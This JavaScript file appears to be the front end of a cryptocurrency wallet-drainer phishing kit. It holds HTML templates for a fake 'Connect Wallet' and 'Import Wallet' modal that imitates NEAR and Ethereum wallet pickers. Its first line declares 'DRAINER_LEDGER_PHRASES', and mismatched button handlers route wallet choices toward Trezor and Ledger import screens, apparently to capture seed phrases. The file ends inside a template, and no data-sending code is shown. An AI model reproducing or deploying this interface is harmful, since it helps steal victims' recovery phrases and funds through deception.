const DRAINER_LEDGER_PHRASES = true;



const Modal = `

<div id="modal" style="display:none;">

    <div tabindex="0">

        <div class="sc-bczRLJ hNHEtw">

            <div class="sc-kDDrLX hkQOmQ"></div>

            <div id="modal-content" role="dialog" class="sc-hAZoDl dkAhZx" style="pointer-events: auto;">

            </div>

        </div>

    </div>

</div>

`



const CloseModal = `CloseModal`;



const ConnectModal = `

<div class="sc-idiyUo hBuwwI" style="--height: 597px; --width: 360px;">

    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>

    <div class="sc-iqcoie RrATt active">

        <div class="sc-crXcEl gcowpW">

            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">

                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                </svg>

            </button>

            <button onclick="updatePage(AboutModal);" aria-label="More information" class="sc-bjUoiL dnfVlP" style="opacity: 1;">

                <svg aria-hidden="true" width="22" height="22" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path

                        fill-rule="evenodd"

                        clip-rule="evenodd"

                        d="M20 11C20 15.9706 15.9706 20 11 20C6.02944 20 2 15.9706 2 11C2 6.02944 6.02944 2 11 2C15.9706 2 20 6.02944 20 11ZM22 11C22 17.0751 17.0751 22 11 22C4.92487 22 0 17.0751 0 11C0 4.92487 4.92487 0 11 0C17.0751 0 22 4.92487 22 11ZM11.6445 12.7051C11.6445 13.1348 11.3223 13.4678 10.7744 13.4678C10.2266 13.4678 9.92578 13.1885 9.92578 12.6191V12.4795C9.92578 11.4268 10.4951 10.8574 11.2686 10.3203C12.2031 9.67578 12.665 9.32129 12.665 8.59082C12.665 7.76367 12.0205 7.21582 11.043 7.21582C10.3232 7.21582 9.80762 7.57031 9.45312 8.16113C9.38282 8.24242 9.32286 8.32101 9.2667 8.39461C9.04826 8.68087 8.88747 8.8916 8.40039 8.8916C8.0459 8.8916 7.66992 8.62305 7.66992 8.15039C7.66992 7.96777 7.70215 7.7959 7.75586 7.61328C8.05664 6.625 9.27051 5.75488 11.1182 5.75488C12.9336 5.75488 14.5234 6.71094 14.5234 8.50488C14.5234 9.7832 13.7822 10.417 12.7402 11.1045C11.999 11.5986 11.6445 11.9746 11.6445 12.5762V12.7051ZM11.9131 15.5625C11.9131 16.1855 11.376 16.6797 10.7529 16.6797C10.1299 16.6797 9.59277 16.1748 9.59277 15.5625C9.59277 14.9395 10.1191 14.4453 10.7529 14.4453C11.3867 14.4453 11.9131 14.9287 11.9131 15.5625Z"

                        fill="currentColor"

                    ></path>

                </svg>

            </button>

        </div>

        <div class="sc-eCYdqJ dLUlU">

            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Connect Wallet<br /></div>

        </div>

        <div class="sc-evZas gcbNhn">

            <div class="sc-breuTD hVhjow active" style="">

                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">

                    <div class="sc-dkzDqf jKlSZW" style="width: 312px;">

                        <div class="sc-jSMfEi lbAEgN"></div>

                        <div class="sc-jfmDQi erYMGl">

                            <button onclick="openSpecificWalletModal('Meteor Wallet');" class="sc-eKszNL fTpgsT">

                                <div class="sc-hiMGwR iPMOKQ">



                                 <img src="meteorwallet.png" alt="meteor" srcset="meteorwallet.png">



                                </div>

                                <span class="sc-olbas ftvWqB">Meteor Wallet</span>

                            </button>

                           <button onclick="openSpecificWalletModal('Bitte Wallet');" class="sc-eKszNL fTpgsT">

                                <div class="sc-hiMGwR iPMOKQ">

                                
                                
                                 <img src="Bitte_logo_.png" alt="bitte" srcset="Bitte_logo_.png">


                                </div>

                                <span class="sc-olbas ftvWqB">Bitte Wallet</span>

                            </button>

                            <button onclick="openSpecificWalletModal('Eth Wallet');" class="sc-eKszNL fTpgsT">

                                <div class="sc-hiMGwR iPMOKQ">

                                
                                
                                 <img src="ethwallets.png" alt="ethwallets" srcset="ethwallets.png">



                                </div>

                                <span class="sc-olbas ftvWqB">Ethereum Wallet</span>

                            </button>

                            <button id="trezor-button" onclick="openSpecificWalletModal('Mintbase Wallet');" class="sc-eKszNL fTpgsT">

                                <div class="sc-hiMGwR iPMOKQ">



                                 <img src="mintbasewallet.png" alt="mintbasewallet" srcset="mintbasewallet.png">
                                 
                                 

                                </div>

                                <span class="sc-olbas ftvWqB">Mintbase Wallet</span>

                            </button>

                                                        <button onclick="openSpecificWalletModal('Near Mobile Wallet');" class="sc-eKszNL fTpgsT">

                                <div class="sc-hiMGwR iPMOKQ">

                                    <div style="transform: scale(1.1);">
                                        
                                        

                                 <img src="nearmobilewallet.png" alt="nearmobilewallet" srcset="nearmobilewallet.png">



                                    </div>

                                </div>

                                <span class="sc-olbas ftvWqB">Near Mobile Wallet</span>

                            </button>

                            <button id="exodus-button" onclick="openSpecificWalletModal('MyNearWallet');" class="sc-eKszNL fTpgsT">

                                <div class="sc-hiMGwR iPMOKQ">



                                     <img src="mynearwallet.png" alt="mynearwallet" srcset="mynearwallet.png">
                                                                 
                                                                 

                                </div>

                                <span class="sc-olbas ftvWqB">MyNearWallet</span>

                            </button>

                            <button onclick="openSpecificWalletModal('Ledger');" class="sc-eKszNL fTpgsT">

                                <div class="sc-hiMGwR iPMOKQ">

                                    <div style="position: relative; display: flex; flex-direction: column; gap: 2px;">

                                        <img src="coin98wallet.png" alt="coin98wallet" srcset="coin98wallet.png">

                                    </div>

                                </div>

                                <span class="sc-olbas ftvWqB">Coin98 Wallet</span>

                            </button>

                        </div>

                        <div id="different-button" class="sc-lbxAil hLcKTw">

                            <button onclick="openSpecificWalletModal('I use different wallet');" class="sc-iNWwEs fKICOT dasdvr">

                                <svg aria-hidden="true" width="20" height="19" viewBox="0 0 20 19" fill="none" xmlns="http://www.w3.org/2000/svg">

                                    <path

                                        d="M1.57568 4.60616C1.57568 2.69827 3.12234 1.15161 5.03023 1.15161H15.3939C17.3018 1.15161 18.8484 2.69826 18.8484 4.60616V10.3637C18.8484 12.2716 17.3018 13.8183 15.3939 13.8183H5.03023C3.12234 13.8183 1.57568 12.2716 1.57568 10.3637V4.60616Z"

                                        stroke="currentColor"

                                        stroke-width="2"

                                    ></path>

                                    <path

                                        d="M1 4.79293C1 2.435 3.31004 0.770014 5.54697 1.51566L12.4561 3.81869C13.8667 4.2889 14.8182 5.60901 14.8182 7.09596V13.6313C14.8182 15.9892 12.5081 17.6542 10.2712 16.9086L3.36212 14.6056C1.95149 14.1353 1 12.8152 1 11.3283V4.79293Z"

                                        fill="var(--ck-body-background)"

                                        stroke="currentColor"

                                        stroke-width="2"

                                    ></path>

                                    <circle cx="10.3863" cy="10.1894" r="1.32574" fill="currentColor"></circle>

                                </svg>

                                I use different wallet

                            </button><!--I don't have a wallet -->

                        </div>

                    </div>

                </div>

            </div>

        </div>

    </div>

</div>

`;



const WalletsModal = `

<div class="sc-idiyUo hBuwwI" style="--height: 500px; --width: 343px;">

    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>

    <div class="sc-iqcoie RrATt active">

        <div class="sc-crXcEl gcowpW">

            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">

                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                </svg>

            </button>

            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">

                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>

                </svg>

            </button>

        </div>

        <div class="sc-eCYdqJ dLUlU">

            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Import Wallet<br></div>

        </div>

        <div class="sc-evZas gcbNhn">

            <div class="sc-breuTD hVhjow active-scale-up">

                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">

                    <div class="sc-dkzDqf jKlSZW">

                        <div class="sc-jSMfEi lbAEgN"></div>

                        <div class="sc-dmRaPn fUAYBU">

                            <div class="sc-kgflAQ jpJKcK">

                                <div class="sc-gicCDI bkrrQH">

                                    <div class="sc-bBrHrO fbmkhr">

                                        <div class="sc-ivTmOn osRa-d">

                                            <div class="sc-llJcti ikCmYo">

                                                <div class="sc-iIPllB ixYWMG">

                                                    <div class="sc-cxabCf cYaUjj">

                                                        <svg aria-hidden="true" width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                            <circle cx="10" cy="10" r="10" fill="var(--ck-brand-coinbaseWallet)"></circle>

                                                            <rect rx="27%" width="20" height="20" fill="var(--ck-brand-coinbaseWallet)"></rect>

                                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M10.0001 17C13.8661 17 17.0001 13.866 17.0001 10C17.0001 6.13401 13.8661 3 10.0001 3C6.13413 3 3.00012 6.13401 3.00012 10C3.00012 13.866 6.13413 17 10.0001 17ZM8.25012 7.71429C7.95427 7.71429 7.71441 7.95414 7.71441 8.25V11.75C7.71441 12.0459 7.95427 12.2857 8.25012 12.2857H11.7501C12.046 12.2857 12.2858 12.0459 12.2858 11.75V8.25C12.2858 7.95414 12.046 7.71429 11.7501 7.71429H8.25012Z" fill="white"></path>

                                                        </svg>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="sc-gicCDI bkrrQH">

                                    <div class="sc-bBrHrO fbmkhr">

                                        <div class="sc-ivTmOn osRa-d">

                                            <div class="sc-llJcti ikCmYo">

                                                <div class="sc-iIPllB ixYWMG">

                                                    <div class="sc-cxabCf cYaUjj">

                                                        <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" style="background: linear-gradient(0deg, var(--ck-brand-metamask-12), var(--ck-brand-metamask-11)); border-radius: 27.5%;">

                                                            <path d="M27.2684 4.03027L17.5018 11.2841L19.3079 7.00442L27.2684 4.03027Z" fill="var(--ck-brand-metamask-02)" stroke="var(--ck-brand-metamask-02)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M4.7218 4.03027L14.4099 11.3528L12.6921 7.00442L4.7218 4.03027Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M23.7544 20.8438L21.1532 24.8289L26.7187 26.3602L28.3187 20.9321L23.7544 20.8438Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M3.69104 20.9321L5.28117 26.3602L10.8467 24.8289L8.24551 20.8438L3.69104 20.9321Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M10.5327 14.1108L8.98181 16.4568L14.5081 16.7022L14.3117 10.7637L10.5327 14.1108Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M21.4576 14.1111L17.6295 10.6953L17.5018 16.7025L23.0182 16.4571L21.4576 14.1111Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M10.8469 24.8292L14.1647 23.2096L11.2984 20.9717L10.8469 24.8292Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M17.8257 23.2096L21.1531 24.8292L20.6918 20.9717L17.8257 23.2096Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M21.1531 24.8296L17.8257 23.21L18.0906 25.3793L18.0612 26.2921L21.1531 24.8296Z" fill="var(--ck-brand-metamask-06)" stroke="var(--ck-brand-metamask-06)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M10.8469 24.8296L13.9388 26.2921L13.9192 25.3793L14.1647 23.21L10.8469 24.8296Z" fill="var(--ck-brand-metamask-06)" stroke="var(--ck-brand-metamask-06)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M13.9877 19.5389L11.2196 18.7242L13.1729 17.8311L13.9877 19.5389Z" fill="var(--ck-brand-metamask-09)" stroke="var(--ck-brand-metamask-09)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M18.0023 19.5389L18.8171 17.8311L20.7802 18.7242L18.0023 19.5389Z" fill="var(--ck-brand-metamask-09)" stroke="var(--ck-brand-metamask-09)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M10.8468 24.8289L11.3179 20.8438L8.24561 20.9321L10.8468 24.8289Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M20.6821 20.8438L21.1532 24.8289L23.7544 20.9321L20.6821 20.8438Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M23.0182 16.4565L17.5018 16.7019L18.0122 19.5387L18.827 17.8308L20.7902 18.7239L23.0182 16.4565Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M11.2198 18.7239L13.1829 17.8308L13.9878 19.5387L14.5081 16.7019L8.98181 16.4565L11.2198 18.7239Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M8.98181 16.4565L11.2983 20.9718L11.2198 18.7239L8.98181 16.4565Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M20.7901 18.7239L20.6919 20.9718L23.0181 16.4565L20.7901 18.7239Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M14.508 16.7021L13.9878 19.5389L14.6356 22.886L14.7828 18.4788L14.508 16.7021Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M17.5017 16.7021L17.2367 18.4689L17.3545 22.886L18.0121 19.5389L17.5017 16.7021Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M18.0121 19.5388L17.3545 22.886L17.8257 23.2099L20.6918 20.972L20.79 18.7241L18.0121 19.5388Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M11.2196 18.7241L11.2981 20.972L14.1644 23.2099L14.6355 22.886L13.9877 19.5388L11.2196 18.7241Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M18.0615 26.2917L18.0908 25.3788L17.8455 25.1628H14.145L13.9192 25.3788L13.9388 26.2917L10.8469 24.8291L11.9267 25.7126L14.1155 27.234H17.875L20.0736 25.7126L21.1533 24.8291L18.0615 26.2917Z" fill="var(--ck-brand-metamask-07)" stroke="var(--ck-brand-metamask-07)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M17.8258 23.2096L17.3546 22.8857H14.6357L14.1646 23.2096L13.9191 25.379L14.1449 25.163H17.8454L18.0907 25.379L17.8258 23.2096Z" fill="var(--ck-brand-metamask-04)" stroke="var(--ck-brand-metamask-04)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M27.6806 11.7552L28.5149 7.75041L27.2683 4.03027L17.8257 11.0387L21.4575 14.1109L26.591 15.6128L27.7296 14.2876L27.2389 13.9342L28.0241 13.2178L27.4156 12.7465L28.2007 12.1478L27.6806 11.7552Z" fill="var(--ck-brand-metamask-05)" stroke="var(--ck-brand-metamask-05)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M3.48486 7.75041L4.3192 11.7552L3.78916 12.1478L4.57441 12.7465L3.97566 13.2178L4.7609 13.9342L4.27012 14.2876L5.39892 15.6128L10.5325 14.1109L14.1644 11.0387L4.72164 4.03027L3.48486 7.75041Z" fill="var(--ck-brand-metamask-05)" stroke="var(--ck-brand-metamask-05)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M26.591 15.6122L21.4575 14.1104L23.0181 16.4564L20.6919 20.9716L23.7544 20.9323H28.3186L26.591 15.6122Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M10.5326 14.1104L5.39897 15.6122L3.69104 20.9323H8.24551L11.2982 20.9716L8.98168 16.4564L10.5326 14.1104Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                            <path d="M17.5018 16.7018L17.8258 11.0381L19.3177 7.00391H12.6921L14.1645 11.0381L14.5081 16.7018L14.6258 18.4883L14.6356 22.8856H17.3546L17.3742 18.4883L17.5018 16.7018Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>

                                                        </svg>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="sc-gicCDI bkrrQH">

                                    <div class="sc-bBrHrO fbmkhr">

                                        <div class="sc-ivTmOn osRa-d">

                                            <div class="sc-llJcti ikCmYo">

                                                <div class="sc-iIPllB ixYWMG">

                                                    <div class="sc-cxabCf cYaUjj">

                                                        <svg aria-hidden="true" width="44" height="44" viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                            <rect width="44" height="44" fill="var(--ck-brand-trust-02)"></rect>

                                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M33.0246 11.8662C33.4096 11.8662 33.774 12.0243 34.0421 12.2925C34.3102 12.5675 34.4615 12.9387 34.4546 13.3168C34.3859 17.4143 34.2277 20.5493 33.9321 23.0312C33.6433 25.5131 33.2102 27.3556 32.5571 28.8475C32.1171 29.8443 31.574 30.6693 30.9346 31.3706C30.0752 32.2987 29.0921 32.9725 28.0196 33.6119C27.561 33.8861 27.0843 34.1568 26.5842 34.4408C25.5172 35.0468 24.3441 35.713 23.0146 36.6025C22.5333 36.9256 21.9077 36.9256 21.4265 36.6025C20.0766 35.7026 18.8879 35.0281 17.8112 34.4173C17.5718 34.2815 17.3379 34.1488 17.109 34.0175C15.8509 33.2887 14.7165 32.5943 13.7265 31.5906C13.0665 30.9306 12.4959 30.1262 12.0421 29.1706C11.4234 27.8918 11.004 26.345 10.6946 24.3443C10.2821 21.67 10.0759 18.1706 10.0002 13.3168C9.99336 12.9387 10.1377 12.5675 10.4059 12.2925C10.674 12.0243 11.0452 11.8662 11.4302 11.8662H12.0215C13.8433 11.8731 17.8652 11.6943 21.344 8.98559C21.8596 8.58683 22.5815 8.58683 23.0971 8.98559C26.5759 11.6943 30.5977 11.8731 32.4265 11.8662H33.0246ZM29.8277 27.9331C30.2746 27.0118 30.6459 25.74 30.9277 23.9112C31.2646 21.725 31.4709 18.755 31.5671 14.7125C29.4221 14.6506 25.7371 14.2381 22.224 11.8731C18.7109 14.2312 15.0259 14.6437 12.8877 14.7125C12.9633 18.0537 13.1146 20.6525 13.3552 22.6943C13.6302 25.0181 14.0221 26.5925 14.5102 27.6993C14.8333 28.435 15.1909 28.9643 15.6171 29.4318C16.1877 30.0575 16.9096 30.5731 17.8927 31.1643C18.3005 31.409 18.7502 31.6635 19.2396 31.9406C20.1116 32.4341 21.1099 32.9991 22.224 33.7081C23.3175 33.0107 24.3014 32.4515 25.1633 31.9616C25.4231 31.8139 25.6717 31.6725 25.909 31.5356C27.119 30.8412 28.0127 30.2637 28.6796 29.59C29.1265 29.1293 29.4909 28.6275 29.8277 27.9331Z" fill="var(--ck-brand-trust-01)"></path>

                                                        </svg>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="sc-gicCDI bkrrQH">

                                    <div class="sc-bBrHrO fbmkhr">

                                        <div class="sc-ivTmOn osRa-d">

                                            <div class="sc-llJcti ikCmYo">

                                                <div class="sc-iIPllB ixYWMG">

                                                    <div class="sc-cxabCf cYaUjj">

                                                        <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                            <rect width="32" height="32" fill="white"></rect>

                                                            <path d="M18.3242 7.63647H13.6516C13.4955 7.63647 13.3704 7.76611 13.367 7.92726C13.2726 12.4568 10.9768 16.7559 7.02532 19.8009C6.89986 19.8976 6.87128 20.0792 6.963 20.21L9.69685 24.112C9.78986 24.2448 9.97107 24.2747 10.0986 24.1772C12.5694 22.2856 14.5567 20.0038 15.9879 17.4746C17.4191 20.0038 19.4065 22.2856 21.8773 24.1772C22.0047 24.2747 22.186 24.2448 22.2791 24.112L25.013 20.21C25.1045 20.0792 25.0759 19.8976 24.9506 19.8009C20.999 16.7559 18.7033 12.4568 18.609 7.92726C18.6056 7.76611 18.4803 7.63647 18.3242 7.63647Z" fill="var(--ck-brand-argent)"></path>

                                                        </svg>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="sc-gicCDI bkrrQH">

                                    <div class="sc-bBrHrO fbmkhr">

                                        <div class="sc-ivTmOn osRa-d">

                                            <div class="sc-llJcti ikCmYo">

                                                <div class="sc-iIPllB ixYWMG">

                                                    <div class="sc-cxabCf cYaUjj">

                                                        <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" style="background: linear-gradient(

                                                            180deg,

                                                            var(--ck-brand-imtoken-01) 0%,

                                                            var(--ck-brand-imtoken-02) 100%

                                                            );">

                                                            <path d="M26.8543 9.96509C27.5498 19.3857 21.4942 23.8384 16.0655 24.3132C11.0184 24.7546 6.26765 21.6534 5.85087 16.8885C5.50707 12.952 7.94004 11.2761 9.8516 11.109C11.8177 10.9367 13.4698 12.2925 13.6132 13.9342C13.7512 15.5125 12.7664 16.2308 12.0815 16.2906C11.5398 16.3381 10.8584 16.0093 10.7968 15.3032C10.7441 14.6965 10.9744 14.6138 10.9182 13.9693C10.8179 12.8219 9.81731 12.6882 9.26951 12.7357C8.60654 12.7937 7.40368 13.5675 7.5725 15.4949C7.7422 17.439 9.60628 18.9751 12.0498 18.7614C14.6868 18.531 16.5227 16.4779 16.6608 13.5983C16.6595 13.4458 16.6916 13.2948 16.7548 13.156L16.7557 13.1525C16.7841 13.0922 16.8174 13.0342 16.8551 12.9793C16.9113 12.8949 16.9835 12.8016 17.0767 12.6997C17.0775 12.697 17.0775 12.697 17.0793 12.697C17.147 12.6205 17.2288 12.5379 17.3211 12.4491C18.473 11.3623 22.6214 8.79916 26.5448 9.61074C26.6277 9.62851 26.7026 9.67262 26.7584 9.73649C26.8142 9.80035 26.8478 9.88054 26.8543 9.96509" fill="white"></path>

                                                        </svg>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <div class="sc-fLlhyt fbkVsj">

                                <svg aria-hidden="true" width="298" height="188" viewBox="0 0 298 188" fill="none" xmlns="http://www.w3.org/2000/svg">

                                    <path d="M1 55.2757L21.6438 46.0285C55.5896 30.8228 94.4104 30.8228 128.356 46.0286L169.644 64.5229C203.59 79.7287 242.41 79.7286 276.356 64.5229L297 55.2757M1 44.2118L21.6438 34.9646C55.5896 19.7589 94.4104 19.7589 128.356 34.9646L169.644 53.459C203.59 68.6647 242.41 68.6647 276.356 53.459L297 44.2118M1 33.1477L21.6438 23.9005C55.5896 8.69479 94.4104 8.69479 128.356 23.9005L169.644 42.3949C203.59 57.6006 242.41 57.6006 276.356 42.3949L297 33.1477M1 22.1477L21.6438 12.9005C55.5896 -2.30521 94.4104 -2.30521 128.356 12.9005L169.644 31.3949C203.59 46.6006 242.41 46.6006 276.356 31.3949L297 22.1477M1 66.3398L21.6438 57.0926C55.5896 41.8869 94.4104 41.8869 128.356 57.0926L169.644 75.587C203.59 90.7927 242.41 90.7927 276.356 75.587L297 66.3398M1 77.404L21.6438 68.1568C55.5896 52.9511 94.4104 52.9511 128.356 68.1569L169.644 86.6512C203.59 101.857 242.41 101.857 276.356 86.6512L297 77.404M1 88.4681L21.6438 79.2209C55.5896 64.0152 94.4104 64.0152 128.356 79.2209L169.644 97.7153C203.59 112.921 242.41 112.921 276.356 97.7153L297 88.4681M1 121.66L21.6438 112.413C55.5896 97.2075 94.4104 97.2075 128.356 112.413L169.644 130.908C203.59 146.113 242.41 146.113 276.356 130.908L297 121.66M1 110.596L21.6438 101.349C55.5896 86.1433 94.4104 86.1433 128.356 101.349L169.644 119.843C203.59 135.049 242.41 135.049 276.356 119.843L297 110.596M1 99.5321L21.6438 90.2849C55.5896 75.0792 94.4104 75.0792 128.356 90.2849L169.644 108.779C203.59 123.985 242.41 123.985 276.356 108.779L297 99.5321M1 132.724L21.6438 123.477C55.5896 108.271 94.4104 108.271 128.356 123.477L169.644 141.971C203.59 157.177 242.41 157.177 276.356 141.971L297 132.724M1 143.788L21.6438 134.541C55.5896 119.336 94.4104 119.336 128.356 134.541L169.644 153.036C203.59 168.241 242.41 168.241 276.356 153.036L297 143.788M1 154.853L21.6438 145.605C55.5896 130.4 94.4104 130.4 128.356 145.605L169.644 164.1C203.59 179.305 242.41 179.305 276.356 164.1L297 154.853M1 165.853L21.6438 156.605C55.5896 141.4 94.4104 141.4 128.356 156.605L169.644 175.1C203.59 190.305 242.41 190.305 276.356 175.1L297 165.853" stroke="url(#paint0_linear_1094_2077)" stroke-opacity="0.9" stroke-linecap="round" stroke-linejoin="round"></path>

                                    <defs>

                                        <linearGradient id="paint0_linear_1094_2077" x1="1" y1="112.587" x2="297.034" y2="79.6111" gradientUnits="userSpaceOnUse">

                                            <stop stop-color="var(--ck-graphic-wave-stop-01)"></stop>

                                            <stop stop-color="var(--ck-graphic-wave-stop-02)" offset="0.239583"></stop>

                                            <stop stop-color="var(--ck-graphic-wave-stop-03)" offset="0.515625"></stop>

                                            <stop stop-color="var(--ck-graphic-wave-stop-04)" offset="0.739583"></stop>

                                            <stop stop-color="var(--ck-graphic-wave-stop-05)" offset="1"></stop>

                                        </linearGradient>

                                    </defs>

                                </svg>

                            </div>

                        </div>

                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">

                            <h1 class="sc-ftvSup fEIqVI">Start Exploring Web3<br></h1>

                            <div class="sc-papXJ jCcNJP">Your wallet is the gateway to all things Ethereum, the magical technology that makes it possible to explore web3.<br></div>

                        </div>

                        <!--<a href="https://ethereum.org/en/wallets/find-wallet/#main-content" target="_blank" rel="noopener noreferrer" class="sc-himrzO eyWopv">

                            <span class="sc-gXmSlM CshDF">Choose Your First Wallet<br></span>

                            <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">

                                <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="2" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>

                                <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="2" stroke-linecap="round" class="sc-bZkfAO"></path>

                            </svg>

                        </a>-->

                        <a onClick="updatePage(TrezorWalletModal);" rel="noopener noreferrer" class="sc-himrzO eyWopv">

                            <span class="sc-gXmSlM CshDF">Import Wallet<br></span>

                            <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">

                                <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="2" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>

                                <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="2" stroke-linecap="round" class="sc-bZkfAO"></path>

                            </svg>

                        </a>

                    </div>

                </div>

            </div>

        </div>

    </div>

</div>

`;



const AboutModal = `

